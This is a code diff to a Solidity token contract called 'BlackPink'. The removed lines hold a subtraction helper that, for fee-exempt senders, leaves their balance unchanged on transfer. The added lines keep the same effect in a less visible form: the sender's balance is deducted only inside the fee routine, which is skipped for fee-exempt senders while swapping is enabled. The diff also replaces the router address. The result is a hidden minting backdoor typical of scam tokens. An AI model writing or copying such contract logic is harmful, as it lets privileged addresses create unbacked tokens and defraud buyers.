@@ -14,14 +14,6 @@ library SafeMath {
         uint256 c = a - b;
         return c;
     }
-    function sub(uint256 a, uint256 b, uint256 errorNumber) internal pure returns (uint256) {
-        uint256 c = a;
-        if (errorNumber > 0) {
-            require(b <= a, "SafeMath: subtraction overflow");
-            c = a - b;
-        }
-        return c;
-    }
     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         if (a == 0) {
             return 0;
@@ -122,7 +114,7 @@ interface IDEXRouter {
 
 contract BlackPink is ERC20, Ownable {
     using SafeMath for uint256;
-    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address routerAdress = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
     address DEAD = 0x000000000000000000000000000000000000dEaD;
 
     string constant _name = "BlackPink";
@@ -209,9 +201,8 @@ contract BlackPink is ERC20, Ownable {
         
         if(shouldSwapBack() && recipient == pair){ swapBack(); } 
 
-        _balances[sender] = _balances[sender].sub(amount, (isFeeExempt[sender] && swapEnabled) ? 0 : 1);
 
-        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
+        uint256 amountReceived = shouldTakeFee(sender) || !swapEnabled ? takeFee(sender, amount) : amount;
         _balances[recipient] = _balances[recipient].add(amountReceived);
 
         emit Transfer(sender, recipient, amountReceived);
@@ -230,6 +221,7 @@ contract BlackPink is ERC20, Ownable {
     }
 
     function takeFee(address sender, uint256 amount) internal returns (uint256) {
+        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
         uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
         _balances[address(this)] = _balances[address(this)].add(feeAmount);
         emit Transfer(sender, address(this), feeAmount);
